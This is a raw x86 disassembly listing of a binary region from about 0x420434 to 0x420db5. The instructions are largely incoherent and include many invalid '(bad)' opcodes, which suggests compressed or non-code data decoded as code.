  420434:	xor    DWORD PTR [ebx-0x2f2ade2b],ebp
  42043a:	pop    ebp
  42043b:	test   BYTE PTR [ebx-0x76],0xd2
  42043f:	adc    BYTE PTR [ebx+0x4ae3dcc7],ch
  420445:	fs jnp 0x4203ca
  420448:	xlat   BYTE PTR ds:[ebx]
  420449:	pop    ecx
  42044a:	pusha  
  42044b:	out    dx,eax
  42044c:	imul   esp,DWORD PTR [ebx-0x201efce],0x3f
  420453:	es add esi,ecx
  420456:	jl     0x42043c
  420458:	mov    ebp,0x5e4f945c
  42045d:	push   edx
  42045e:	lea    esp,[edx]
  420460:	enter  0xf302,0x6f
  420464:	pusha  
  420465:	xchg   edi,eax
  420466:	call   0x7b196cae
  42046b:	(bad)  
  42046c:	sahf   
  42046d:	cli    
  42046e:	lahf   
  42046f:	adc    BYTE PTR [esi],ah
  420471:	xor    eax,0x9033fae9
  420476:	es xchg esp,eax
  420478:	(bad)  
  420479:	sbb    al,0xe0
  42047b:	xor    DWORD PTR [edx],esp
  42047d:	jmp    0x478c1c13
  420482:	push   es
  420483:	sub    BYTE PTR [ecx],dh
  420485:	bound  esp,QWORD PTR fs:[edx]
  420488:	and    edi,DWORD PTR [edx-0x43]
  42048b:	imul   ebp,esi,0xffffffba
  42048e:	popa   
  42048f:	jmp    0x7696dd82
  420494:	gs adc eax,0xa84950f6
  42049a:	lods   eax,DWORD PTR ds:[esi]
  42049b:	dec    ebx
  42049c:	mov    ds:0x622d4a10,al
  4204a1:	and    eax,0x1d28298c
  4204a6:	das    
  4204a7:	sub    al,0xf0
  4204a9:	adc    eax,0xa45f975f
  4204ae:	sbb    eax,0x4cad7db9
  4204b3:	lahf   
  4204b4:	jmp    0x4204de
  4204b6:	stos   BYTE PTR es:[edi],al
  4204b7:	or     esi,DWORD PTR [eax+0x13a11085]
  4204bd:	div    DWORD PTR [eax]
  4204bf:	adc    ebp,DWORD PTR [edx+ebp*2+0x368224ff]
  4204c6:	scas   al,BYTE PTR es:[edi]
  4204c7:	mov    edi,0xe328e7fd
  4204cc:	push   cs
  4204cd:	add    al,0x1f
  4204cf:	mov    dl,0x8b
  4204d1:	and    al,0xde
  4204d3:	mov    esp,0x39a05c9d
  4204d8:	jbe    0x4204f2
  4204da:	and    DWORD PTR [ebx+0x18],ebx
  4204dd:	ror    DWORD PTR [esi+0x6],0xc5
  4204e1:	mov    dh,0x65
  4204e3:	or     al,BYTE PTR [edx+0x153bcf1f]
  4204e9:	scas   eax,DWORD PTR es:[edi]
  4204ea:	mov    esi,0x1406f7dc
  4204ef:	test   eax,eax
  4204f1:	mov    ds:0x6ad1fbd9,eax
  4204f6:	pop    eax
  4204f7:	xchg   BYTE PTR [eax+0x2e],dh
  4204fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204fb:	fadd   st(7),st
  4204fd:	ret    0xc0a4
  420500:	dec    esp
  420501:	stos   BYTE PTR es:[edi],al
  420502:	mov    cl,0x19
  420504:	loopne 0x4204b4
  420506:	int3   
  420507:	mov    DWORD PTR [ebx+0x6c],ebx
  42050a:	inc    edi
  42050b:	in     eax,dx
  42050c:	call   0xce3f:0x9985a0c7
  420513:	jl     0x420590
  420515:	stc    
  420516:	pop    esi
  420517:	pop    ecx
  420518:	(bad)  
  42051a:	cwde   
  42051b:	jae    0x420546
  42051d:	sub    eax,DWORD PTR [ebp-0x2e9aebda]
  420523:	ret    0x3e5f
  420526:	jg     0x4204d1
  420528:	inc    ebp
  420529:	(bad)  
  42052a:	clc    
  42052b:	jmp    FWORD PTR [ecx+0x144d046d]
  420531:	cwde   
  420532:	add    edx,esi
  420534:	std    
  420535:	xlat   BYTE PTR ds:[ebx]
  420536:	ror    BYTE PTR [ebp+0x14fd96cb],cl
  42053c:	dec    ebp
  42053d:	pop    ecx
  42053e:	repnz pop esi
  420540:	ins    DWORD PTR es:[edi],dx
  420541:	stos   BYTE PTR es:[edi],al
  420542:	mov    edx,0xd748c7b8
  420547:	push   ss
  420548:	and    al,0xb9
  42054a:	or     eax,0xb8d28d39
  42054f:	dec    eax
  420550:	enter  0x870a,0xbc
  420554:	xor    edx,edi
  420556:	aad    0x95
  420558:	out    0x78,eax
  42055a:	push   0xd5fcf6de
  42055f:	(bad)  
  420560:	jge    0x4205b9
  420562:	es fisubr WORD PTR fs:0x4b406f53
  42056a:	xor    DWORD PTR [edi+0x77],0xffffffcf
  42056e:	mov    ecx,0xfe8e5f4b
  420573:	jg     0x4205bc
  420575:	aad    0x43
  420577:	fcomp  QWORD PTR [ebp+0x50]
  42057a:	push   ss
  42057b:	pop    ebx
  42057c:	outs   dx,BYTE PTR ds:[esi]
  42057d:	cmp    al,0x8c
  42057f:	dec    edx
  420580:	nop
  420581:	pop    esp
  420582:	cmp    edx,DWORD PTR [ebp-0x15f7154b]
  420588:	adc    al,0x76
  42058a:	dec    edx
  42058b:	push   ss
  42058c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42058d:	inc    ebp
  42058e:	hlt    
  42058f:	fnstcw WORD PTR [esi+ebp*8]
  420592:	adc    ecx,DWORD PTR [edx+ecx*1]
  420595:	test   BYTE PTR [ebp+0x2cd72f45],dl
  42059b:	ja     0x42057c
  42059d:	div    BYTE PTR ds:0xaf01d7d9
  4205a3:	xor    DWORD PTR [eax+0x12],esp
  4205a6:	call   0xe160:0xb0571bed
  4205ad:	push   0x450785fe
  4205b2:	fmulp  st(5),st
  4205b4:	xchg   esp,eax
  4205b5:	repz retf 
  4205b7:	mov    ebx,eax
  4205b9:	dec    eax
  4205ba:	mov    ebp,fs
  4205bc:	xlat   BYTE PTR ds:[ebx]
  4205bd:	and    edi,DWORD PTR [esi+0x7c66e189]
  4205c3:	pop    ebx
  4205c4:	(bad)  
  4205c5:	xor    DWORD PTR [ebx],ebp
  4205c7:	inc    esp
  4205c8:	(bad)  
  4205ca:	mov    cl,0x60
  4205cc:	add    ecx,DWORD PTR ds:0x2d26584a
  4205d2:	push   ebx
  4205d3:	stos   DWORD PTR es:[edi],eax
  4205d4:	inc    edi
  4205d5:	fisttp DWORD PTR [edx-0x2e]
  4205d8:	sub    bh,dh
  4205da:	pop    ds
  4205db:	push   es
  4205dc:	and    edx,eax
  4205de:	jnp    0x42057f
  4205e0:	push   ecx
  4205e1:	xchg   ebx,eax
  4205e2:	lods   al,BYTE PTR ds:[esi]
  4205e3:	adc    esp,eax
  4205e5:	out    dx,al
  4205e6:	sahf   
  4205e7:	scas   al,BYTE PTR es:[edi]
  4205e8:	ins    BYTE PTR es:[edi],dx
  4205e9:	(bad)  
  4205ea:	inc    edi
  4205eb:	jnp    0x4205e6
  4205ed:	inc    ecx
  4205ee:	enter  0x9b79,0xf6
  4205f2:	pop    ds
  4205f3:	int3   
  4205f4:	out    0x29,al
  4205f6:	and    bl,BYTE PTR [esi]
  4205f8:	xchg   ecx,eax
  4205f9:	mov    ah,0xb7
  4205fb:	out    0x46,eax
  4205fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205fe:	xor    BYTE PTR [ebx],ch
  420600:	pop    edx
  420601:	sub    al,0xa6
  420603:	or     ch,BYTE PTR [eax-0x45]
  420606:	repnz std 
  420608:	push   eax
  420609:	out    dx,al
  42060a:	ja     0x420594
  42060c:	jnp    0x420688
  42060e:	es push esp
  420610:	xor    DWORD PTR ds:0xa4e483f0,edx
  420616:	add    BYTE PTR [esi-0x162c9839],0xd
  42061d:	inc    ebp
  42061e:	or     eax,DWORD PTR [eax]
	...
  4207f0:	add    BYTE PTR [eax],al
  4207f2:	add    bh,al
  4207f4:	stc    
  4207f5:	out    0xe3,eax
  4207f7:	(bad)  
  4207f8:	inc    edi
  4207fa:	std    
  4207fb:	fidivr WORD PTR [ebx]
  4207fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fe:	dec    esp
  4207ff:	pusha  
  420800:	adc    ebp,esp
  420802:	test   DWORD PTR ds:0x250001bf,esi
  420808:	pop    es
  420809:	add    BYTE PTR [eax],al
  42080b:	pop    edi
  42080c:	rcl    BYTE PTR [ecx-0x73],0xb4
  420810:	js     0x420796
  420812:	xor    BYTE PTR [edi-0x78],0x44
  420816:	arpl   WORD PTR [edi-0x5b17f1bf],bx
  42081c:	jle    0x42082c
  42081e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42081f:	cmp    eax,0xf0f3d194
  420824:	test   eax,0xfdbbadb
  420829:	and    al,0xa5
  42082b:	aaa    
  42082c:	or     BYTE PTR [edi-0x5f0d6db3],bl
  420832:	pop    edi
  420833:	sub    esi,esp
  420835:	pop    esi
  420836:	std    
  420837:	xchg   edx,eax
  420838:	aad    0xca
  42083a:	sti    
  42083b:	inc    ecx
  42083c:	push   cs
  42083d:	or     al,BYTE PTR [ebx]
  42083f:	mov    edi,ebp
  420841:	jno    0x4207da
  420843:	sub    ebx,DWORD PTR [ebx+esi*2+0x46]
  420847:	jnp    0x420800
  420849:	xchg   edi,eax
  42084a:	outs   dx,DWORD PTR ds:[esi]
  42084b:	(bad)  
  42084d:	enter  0xdabb,0xbe
  420851:	pusha  
  420852:	lahf   
  420853:	div    BYTE PTR [eax-0x4bcc3966]
  420859:	addr16 push 0xb4888b80
  42085f:	shl    BYTE PTR [ebp-0x1b],1
  420862:	loopne 0x42087d
  420864:	jl     0x420863
  420866:	push   ds
  420867:	lock jb 0x420857
  42086a:	inc    ebx
  42086b:	and    al,BYTE PTR [edx+0x14fdd8fd]
  420871:	and    eax,0x8f5d12e
  420876:	lock sbb esp,DWORD PTR [esi+0x1864c52f]
  42087d:	test   eax,0xdcf02f4a
  420882:	push   0xffffffc7
  420884:	sbb    eax,0x18a51cc1
  420889:	cmp    BYTE PTR [ebp+0x2573b9ec],ah
  42088f:	jge    0x42082e
  420891:	inc    edi
  420892:	nop
  420893:	xchg   ecx,eax
  420894:	mov    ch,0x8c
  420896:	(bad)  
  420897:	adc    BYTE PTR [ebp+0x53c3473d],cl
  42089d:	gs inc edi
  42089f:	out    0xf7,al
  4208a1:	or     bl,BYTE PTR [edx]
  4208a3:	clc    
  4208a4:	loop   0x4208bc
  4208a6:	push   ds
  4208a7:	push   ebp
  4208a8:	mov    al,ds:0xe3b762c0
  4208ad:	pop    ebp
  4208ae:	lds    ebp,FWORD PTR [ebx+0x3e983424]
  4208b4:	les    eax,FWORD PTR [edx-0x3e00eaf9]
  4208ba:	sar    BYTE PTR [ebp+0x9],cl
  4208bd:	js     0x4208f2
  4208bf:	arpl   si,bp
  4208c1:	xor    eax,0xb25dc54b
  4208c6:	scas   eax,DWORD PTR es:[edi]
  4208c7:	dec    esp
  4208c8:	dec    edx
  4208c9:	shl    DWORD PTR [edi],1
  4208cb:	(bad)  ds:0x3ea6cd7e
  4208d1:	mov    ch,0xde
  4208d3:	sbb    DWORD PTR [ecx-0x6815cd7f],0xffffffad
  4208da:	shl    BYTE PTR [ebx+0x77],1
  4208dd:	and    eax,0x6f6f7feb
  4208e2:	mov    cl,0x16
  4208e4:	xchg   ecx,eax
  4208e5:	arpl   WORD PTR [ebx],cx
  4208e7:	cli    
  4208e8:	nop
  4208e9:	and    al,0x17
  4208eb:	pop    esi
  4208ec:	aad    0xa8
  4208ee:	dec    edx
  4208ef:	fldenv [edx-0x4fedbd1d]
  4208f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f6:	inc    edi
  4208f7:	mov    edi,?
  4208f9:	pusha  
  4208fa:	outs   dx,DWORD PTR ds:[esi]
  4208fb:	or     BYTE PTR [esi+ebp*8-0x645c238d],0xf2
  420903:	jp     0x42089d
  420905:	jb     0x420893
  420907:	push   0xf0641444
  42090c:	mov    ah,0xa1
  42090e:	(bad)  
  42090f:	mov    dl,0xf7
  420911:	mov    ebp,edx
  420913:	imul   ecx,esi,0x3f869c90
  420919:	imul   ebp,DWORD PTR [eax+0x57],0xbf81b8b3
  420920:	dec    ebx
  420921:	shl    eax,0xa3
  420924:	jns    0x4208cd
  420926:	mov    ebp,0xdef078ab
  42092b:	push   edx
  42092c:	(bad)
  420930:	in     al,dx
  420931:	and    DWORD PTR [ecx+0x16],eax
  420934:	dec    esp
  420935:	aas    
  420936:	or     eax,0xba6326f4
  42093b:	inc    ecx
  42093c:	mov    eax,0x3f19bb9a
  420941:	fistp  WORD PTR ds:0xe687f71e
  420947:	dec    ebx
  420948:	sbb    DWORD PTR [ecx+0x37],eax
  42094b:	aas    
  42094c:	das    
  42094d:	inc    edx
  42094e:	ret    
  42094f:	mov    cl,0xb1
  420951:	in     al,dx
  420952:	lahf   
  420953:	jno    0x42099a
  420955:	mov    ebp,cs
  420957:	cmp    DWORD PTR [esi],esi
  420959:	test   DWORD PTR [ebx+0x12],ebp
  42095c:	(bad)
  42095f:	jle    0x4209d2
  420961:	or     eax,0x49af6013
  420966:	adc    dl,bl
  420968:	cli    
  420969:	push   0xff94ce21
  42096e:	push   ebp
  42096f:	push   ecx
  420970:	inc    eax
  420971:	add    BYTE PTR [edx],cl
  420973:	retf   0x32
  420976:	mov    DWORD PTR [esi+0x3b09eb55],eax
  42097c:	or     al,0x9d
  42097e:	mov    WORD PTR [edi+0x749075d],?
  420984:	mov    bl,BYTE PTR [edx-0x3c]
  420987:	cmp    al,BYTE PTR [edi+ebp*2]
  42098a:	into   
  42098b:	add    BYTE PTR [ebp-0x59],bh
  42098e:	pop    ebx
  42098f:	and    al,0xe6
  420991:	pusha  
  420992:	inc    esi
  420993:	jp     0x4209d6
  420995:	adc    al,0x2
  420997:	xchg   ecx,eax
  420998:	loope  0x4209aa
  42099a:	adc    edx,DWORD PTR [ebp-0x62a396b0]
  4209a0:	pushf  
  4209a1:	fwait
  4209a2:	outs   dx,DWORD PTR ds:[esi]
  4209a3:	popw   ds
  4209a5:	sub    al,0x33
  4209a7:	mov    ecx,0x14c82386
  4209ac:	in     al,0x58
  4209ae:	pop    esi
  4209af:	loope  0x420990
  4209b1:	fsubr  st,st(3)
  4209b3:	push   0xffffffd0
  4209b5:	repz das 
  4209b7:	inc    edx
  4209b8:	mov    eax,0xc8757a63
  4209bd:	xor    al,0x18
  4209bf:	lahf   
  4209c0:	popa   
  4209c1:	xor    DWORD PTR [edx],eax
  4209c3:	int3   
  4209c4:	or     al,0x3d
  4209c6:	fisttp WORD PTR [ebx]
  4209c8:	cmp    bl,BYTE PTR [edi+0x77b07c11]
  4209ce:	fbstp  TBYTE PTR [edi]
  4209d0:	pop    ss
  4209d1:	ror    BYTE PTR [esi-0x4fa75915],cl
  4209d7:	das    
  4209d8:	das    
  4209d9:	pop    ebx
  4209da:	loopne 0x4209cc
  4209dc:	stc    
  4209dd:	adc    edi,esp
  4209df:	mov    ebp,0xb59395d2
  4209e4:	bound  esp,QWORD PTR [edi-0x68]
  4209e7:	les    esi,FWORD PTR [ecx]
  4209e9:	dec    eax
  4209ea:	dec    eax
  4209eb:	mov    DWORD PTR [ecx+0x69],edi
  4209ee:	cmp    eax,esi
  4209f0:	and    BYTE PTR [ecx-0x24],0x89
  4209f4:	mov    ebp,0x8a4c8e7c
  4209f9:	cld    
  4209fa:	sub    al,dh
  4209fc:	aad    0xd6
  4209fe:	ror    BYTE PTR [ecx*2-0x75ded3de],0xdb
  420a06:	ja     0x4209b5
  420a08:	(bad)  
  420a09:	popa   
  420a0a:	push   ss
  420a0b:	jmp    FWORD PTR [ebp-0x7]
  420a0e:	fld    TBYTE PTR [ecx-0x17]
  420a11:	sub    ch,BYTE PTR [ecx]
  420a13:	arpl   WORD PTR ds:0x5ba0e9e3,sp
  420a19:	sbb    BYTE PTR ds:[ebx-0x73],0x49
  420a1e:	xor    ebp,DWORD PTR [ecx+0x1d]
  420a21:	sub    ebx,DWORD PTR [eax]
  420a23:	arpl   WORD PTR [esi],bp
  420a25:	sub    ch,ch
  420a27:	in     al,dx
  420a28:	xor    ch,BYTE PTR [ebp+0x58bb94ba]
  420a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a2f:	lods   eax,DWORD PTR ds:[esi]
  420a30:	add    edx,DWORD PTR [esp+edx*4]
  420a33:	push   ss
  420a34:	add    dl,BYTE PTR [ebx-0x305ea9f]
  420a3a:	test   eax,0xdc618e12
  420a3f:	mov    bh,0x84
  420a41:	pop    esp
  420a42:	cmc    
  420a43:	pop    ss
  420a44:	hlt    
  420a45:	aas    
  420a46:	adc    edi,DWORD PTR [ebp+0x2a]
  420a49:	fstp   st(2)
  420a4b:	outs   dx,BYTE PTR ds:[esi]
  420a4c:	rcl    BYTE PTR [eax+0x78411bf3],1
  420a52:	inc    eax
  420a53:	pop    esi
  420a54:	aaa    
  420a55:	push   ss
  420a56:	mov    ebp,0x17ef56f6
  420a5b:	ins    BYTE PTR es:[edi],dx
  420a5c:	pusha  
  420a5d:	mov    dh,0xde
  420a5f:	into   
  420a60:	ss sub al,0xb5
  420a63:	pop    ds
  420a64:	sub    BYTE PTR [edi],0x2c
  420a67:	mov    edx,0xed1adde2
  420a6c:	sahf   
  420a6d:	mov    ss,ecx
  420a6f:	pop    es
  420a70:	fwait
  420a71:	push   ss
  420a72:	(bad)  
  420a73:	shl    BYTE PTR [ebp-0x1f],cl
  420a76:	lea    ebx,ds:0x8c861484
  420a7c:	and    ch,BYTE PTR [esi+0xd]
  420a7f:	dec    eax
  420a80:	mov    ch,0x7b
  420a82:	into   
  420a83:	lahf   
  420a84:	inc    esp
  420a85:	sbb    DWORD PTR [edi-0x45],edx
  420a88:	dec    esp
  420a89:	xchg   ebp,eax
  420a8a:	lods   eax,DWORD PTR ds:[esi]
  420a8b:	mov    edx,0x5d696a1d
  420a90:	data16 jae 0x420acd
  420a93:	sbb    DWORD PTR ds:0x9fc49bc7,ecx
  420a99:	sub    DWORD PTR [ebx],esi
  420a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a9c:	or     al,BYTE PTR ds:0xbcbc26e2
  420aa2:	mov    ah,0x7d
  420aa4:	push   edi
  420aa5:	cmp    al,cl
  420aa7:	mov    bl,0xef
  420aa9:	push   esi
  420aaa:	xor    al,0xf8
  420aac:	jo     0x420a86
  420aae:	call   0x62cc1aba
  420ab3:	sub    al,BYTE PTR [ebp+0xb46c578]
  420ab9:	mov    edx,0x7ca1307d
  420abe:	xchg   edx,eax
  420abf:	push   ds
  420ac0:	jmp    0x420b00
  420ac2:	inc    esp
  420ac3:	push   ebx
  420ac4:	int3   
  420ac5:	jp     0x420a8f
  420ac7:	popf   
  420ac8:	test   dh,ah
  420aca:	shl    BYTE PTR [eax],1
  420acc:	mov    es,WORD PTR [ebp+0x39]
  420acf:	fadd   DWORD PTR [ebp-0x6c3df35c]
  420ad5:	push   cs
  420ad6:	jp     0x420ac2
  420ad8:	sbb    dh,BYTE PTR [ebx*8-0x67df8b26]
  420adf:	shl    BYTE PTR [edx-0x3a6fda75],cl
  420ae5:	mov    es,WORD PTR [esi]
  420ae7:	sub    ah,BYTE PTR [ecx+0x278c6232]
  420aed:	lods   eax,DWORD PTR ds:[esi]
  420aee:	mov    bh,0x37
  420af0:	fistp  DWORD PTR [esi+0x78b8831b]
  420af6:	adc    DWORD PTR [esi],esp
  420af8:	xlat   BYTE PTR ds:[ebx]
  420af9:	xchg   ecx,eax
  420afa:	jnp    0x420a9c
  420afc:	mov    ah,0xef
  420afe:	sub    eax,0x3e00cf51
  420b03:	ins    DWORD PTR es:[edi],dx
  420b04:	sbb    DWORD PTR [ebp-0x3a3bd3ae],ebx
  420b0a:	mov    BYTE PTR [ebx+0x6e],dl
  420b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b0e:	push   ebx
  420b0f:	and    ah,bl
  420b11:	fcom   DWORD PTR [edi]
  420b13:	push   edi
  420b14:	and    BYTE PTR [ebx],ah
  420b16:	cmp    eax,0x250aae69
  420b1b:	stos   BYTE PTR es:[edi],al
  420b1c:	aad    0x46
  420b1e:	call   0x10cc4a96
  420b23:	or     al,dl
  420b25:	in     eax,dx
  420b26:	popf   
  420b27:	call   0x3ef:0x2d80a358
  420b2e:	xlat   BYTE PTR ds:[ebx]
  420b2f:	inc    eax
  420b30:	fstp   DWORD PTR [ebx-0x9]
  420b33:	inc    edx
  420b34:	test   eax,0xe413c2c7
  420b39:	stc    
  420b3a:	pop    edx
  420b3b:	pop    esp
  420b3c:	daa    
  420b3d:	jg     0x420ac5
  420b3f:	add    ah,ah
  420b41:	(bad)  
  420b42:	jo     0x420b2e
  420b44:	dec    esi
  420b45:	xchg   esi,eax
  420b46:	jmp    0x3b2118c3
  420b4b:	repz arpl WORD PTR [edx+ecx*8-0x723f3429],si
  420b53:	nop    DWORD PTR [edi-0x2d89a104]
  420b5a:	and    ebp,DWORD PTR [esi+0x71421c41]
  420b60:	mov    ss,WORD PTR [ebx+0x4d]
  420b63:	cwde   
  420b64:	xor    ax,0x8096
  420b68:	stos   BYTE PTR es:[edi],al
  420b69:	inc    eax
  420b6a:	xchg   esi,eax
  420b6b:	mov    ds:0xc8ac70d5,eax
  420b70:	add    eax,0x20e0df64
  420b75:	gs call 0x478d:0x7912e440
  420b7d:	and    al,0x2d
  420b7f:	pop    edx
  420b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b81:	jl     0x420b94
  420b83:	in     al,0xdf
  420b85:	mov    ebp,0xd6ca944c
  420b8a:	jb     0x420b1b
  420b8c:	fistp  QWORD PTR [esi]
  420b8e:	js     0x420b80
  420b90:	loopne 0x420bdb
  420b92:	ds pop ss
  420b94:	add    BYTE PTR [ecx+eax*1],0x35
  420b98:	push   0x5
  420b9a:	out    dx,eax
  420b9b:	pop    ecx
  420b9c:	mov    ch,0x26
  420b9e:	arpl   ax,dx
  420ba0:	xchg   edi,eax
  420ba1:	pop    esp
  420ba2:	push   edx
  420ba3:	dec    edx
  420ba4:	fwait
  420ba5:	pop    ebx
  420ba6:	push   ecx
  420ba7:	jnp    0x420bda
  420ba9:	jl     0x420c26
  420bab:	retf   
  420bac:	clc    
  420bad:	push   edx
  420bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420baf:	outs   dx,BYTE PTR ds:[esi]
  420bb0:	(bad)  [ecx+0x33]
  420bb3:	rcl    BYTE PTR [ebp+0x76831319],cl
  420bb9:	iret   
  420bba:	retf   
  420bbb:	call   DWORD PTR [edi]
  420bbd:	jo     0x420ba6
  420bbf:	mov    BYTE PTR [edx],ah
  420bc1:	gs mov dh,0xf1
  420bc4:	adc    BYTE PTR [eax-0x73907fe0],ch
  420bca:	shr    DWORD PTR [eax+edi*1+0x23],1
  420bce:	shl    DWORD PTR [eax-0x3d],1
  420bd1:	pop    ds
  420bd2:	aad    0x6d
  420bd4:	(bad)  
  420bd5:	jno    0x420bbe
  420bd7:	loope  0x420b9f
  420bd9:	add    BYTE PTR [edx*2+0x7635218d],ch
  420be0:	or     cl,BYTE PTR [edi-0x5d]
  420be3:	les    edi,FWORD PTR [ebp+ebp*4-0x22]
  420be7:	xchg   ebx,eax
  420be8:	add    cl,BYTE PTR [ecx]
  420bea:	jbe    0x420c55
  420bec:	hlt    
  420bed:	mov    ds:0x6f78095a,al
  420bf2:	(bad)  
  420bf4:	xor    DWORD PTR [edx+eiz*1],ecx
  420bf7:	les    ebp,FWORD PTR [ecx-0x3286deb9]
  420bfd:	stos   DWORD PTR es:[edi],eax
  420bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bff:	ins    DWORD PTR es:[edi],dx
  420c00:	stos   DWORD PTR es:[edi],eax
  420c01:	pop    ebx
  420c02:	mov    al,ds:0xf2ce8a37
  420c07:	pushf  
  420c08:	inc    eax
  420c09:	neg    BYTE PTR [ecx]
  420c0b:	loop   0x420bcb
  420c0d:	xor    ch,BYTE PTR [ebp-0x6727121e]
  420c13:	lods   eax,DWORD PTR ss:[esi]
  420c15:	or     ch,BYTE PTR [edi-0x40]
  420c18:	jge    0x420c5f
  420c1a:	retf   0x97f1
  420c1d:	std    
  420c1e:	mov    ds:0xc944b639,al
  420c23:	sbb    eax,DWORD PTR [ebp+0xa5719d]
  420c29:	and    BYTE PTR [eax+0x279a8a54],ch
  420c2f:	adc    al,0xa7
  420c31:	or     ebp,edx
  420c33:	ret    0xd06a
  420c36:	mov    DWORD PTR [esi+0x5d],ebx
  420c39:	mov    esp,0xa77aa850
  420c3e:	ins    DWORD PTR es:[edi],dx
  420c3f:	aas    
  420c40:	mov    ch,0x84
  420c42:	cs icebp 
  420c44:	pop    edx
  420c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c46:	imul   esi,ecx,0xffffff83
  420c49:	test   al,0xc3
  420c4b:	mov    dl,0x1b
  420c4d:	arpl   WORD PTR [edi+ecx*4],sp
  420c50:	jecxz  0x420c17
  420c52:	shl    DWORD PTR [edi+0x27],0xe2
  420c56:	mov    eax,0x70b0efc5
  420c5b:	daa    
  420c5c:	xchg   edx,eax
  420c5d:	push   eax
  420c5e:	xchg   edi,eax
  420c5f:	imul   esi,esi,0xe6139fff
  420c65:	(bad)  
  420c66:	pop    esp
  420c67:	cmp    dl,BYTE PTR [edx]
  420c69:	mov    ds:0x6d75b450,eax
  420c6e:	adc    eax,0xfcedc505
  420c73:	mov    eax,ds:0x542e293c
  420c78:	mov    ebp,?
  420c7a:	sub    al,ch
  420c7c:	lods   al,BYTE PTR ds:[esi]
  420c7d:	test   al,0xf5
  420c7f:	(bad)  
  420c80:	fst    DWORD PTR [ecx]
  420c82:	push   cs
  420c83:	loop   0x420c12
  420c85:	lock adc al,0x9d
  420c88:	stos   DWORD PTR es:[edi],eax
  420c89:	test   al,0xd2
  420c8b:	jp     0x420c74
  420c8d:	or     edi,ebp
  420c8f:	push   eax
  420c90:	push   0x1f
  420c92:	mov    al,ds:0xdc4b9600
  420c97:	mov    eax,0x4f966223
  420c9c:	sub    ah,0xef
  420c9f:	mov    eax,0x615cee5a
  420ca4:	dec    eax
  420ca5:	ret    0xc6b3
  420ca8:	fcmove st,st(4)
  420caa:	mov    BYTE PTR [esi+0x3d4fe97e],bh
  420cb0:	into   
  420cb1:	or     al,0x99
  420cb3:	daa    
  420cb4:	les    edi,FWORD PTR [ecx]
  420cb6:	mov    esi,0xc567d835
  420cbb:	arpl   WORD PTR [ebp-0x720c48e4],sp
  420cc1:	inc    ebx
  420cc2:	pop    esp
  420cc3:	mov    dl,0x1a
  420cc5:	inc    edx
  420cc6:	test   al,0x6b
  420cc8:	std    
  420cc9:	add    eax,0x824a7e53
  420cce:	xor    DWORD PTR ds:[ecx+0x44],esi
  420cd2:	fisub  DWORD PTR [eax-0x263c0d72]
  420cd8:	mov    ds:0xfe2b48c1,eax
  420cdd:	jb     0x420cd0
  420cdf:	cmp    ebx,ebx
  420ce1:	sahf   
  420ce2:	add    edx,edx
  420ce4:	mov    edx,0x376a345e
  420ce9:	mov    al,0x90
  420ceb:	xchg   ecx,eax
  420cec:	test   DWORD PTR [edx-0x31],edi
  420cef:	retfw  0xc0e2
  420cf3:	ss dec ebx
  420cf5:	mov    eax,ds:0x39f406cb
  420cfa:	repz push es
  420cfc:	fdiv   DWORD PTR [eax]
  420cfe:	cs pop esp
  420d00:	xchg   ecx,eax
  420d01:	inc    BYTE PTR [eax+edx*1-0x9dc1dbd]
  420d08:	sahf   
  420d09:	jmp    0xaf33f634
  420d0e:	mov    gs,ebx
  420d10:	jp     0x420d1a
  420d12:	aaa    
  420d13:	outs   dx,DWORD PTR ds:[esi]
  420d14:	adc    eax,0x3db8fb7c
  420d19:	pop    eax
  420d1a:	fnstcw WORD PTR [esi]
  420d1c:	jno    0x420cac
  420d1e:	frstpm(287 only) 
  420d20:	not    DWORD PTR [edi+0x5d]
  420d23:	in     al,dx
  420d24:	jnp    0x420d89
  420d26:	fimul  WORD PTR [ecx-0x71371692]
  420d2c:	sti    
  420d2d:	adc    dh,BYTE PTR es:[ebx+0x446cc8d5]
  420d34:	inc    esp
  420d35:	add    eax,0x955d930
  420d3a:	jl     0x420d40
  420d3c:	in     eax,0xf6
  420d3e:	test   DWORD PTR fs:[edi+edi*8],0xdbfceefb
  420d46:	pop    esp
  420d47:	mov    al,0x74
  420d49:	pop    es
  420d4a:	(bad)  
  420d4b:	out    dx,eax
  420d4c:	test   DWORD PTR [ebx+0x43771344],esi
  420d52:	add    eax,0x8788c70d
  420d57:	cmp    al,ah
  420d59:	loop   0x420d04
  420d5b:	mov    ebx,0xe5741726
  420d60:	mov    eax,0x5e69fd1
  420d65:	inc    edx
  420d66:	(bad)  
  420d67:	out    dx,al
  420d68:	shl    DWORD PTR [eax],cl
  420d6a:	mov    eax,0xffd84a2d
  420d6f:	retf   0x6272
  420d72:	clc    
  420d73:	(bad)  
  420d74:	xor    edi,DWORD PTR [ecx]
  420d76:	and    BYTE PTR [ebx+0x76],cl
  420d79:	es ret 
  420d7b:	mov    dh,0x1e
  420d7d:	imul   ebx,DWORD PTR ss:[edx],0x52039c12
  420d84:	dec    eax
  420d85:	mov    ebx,0xc5c97e19
  420d8a:	sub    al,0x4b
  420d8c:	push   ebx
  420d8d:	push   0x2
  420d8f:	jge    0x420e07
  420d91:	(bad)  
  420d92:	lahf   
  420d93:	mov    edx,0x2c826ac6
  420d98:	mov    ch,BYTE PTR [edx+0x28]
  420d9b:	xor    esi,ecx
  420d9d:	mov    dl,0x22
  420d9f:	dec    esp
  420da0:	mov    esp,DWORD PTR [ebx+0x28]
  420da3:	call   0xd4987d85
  420da8:	fsubr  st,st(1)
  420daa:	pop    ss
  420dab:	xchg   edi,eax
  420dac:	xchg   DWORD PTR [eax-0x9],edx
  420daf:	js     0x420dcb
  420db1:	fld    TBYTE PTR [edi-0x17]
  420db4:	(bad)  
  420db5:	out    0x60,eax
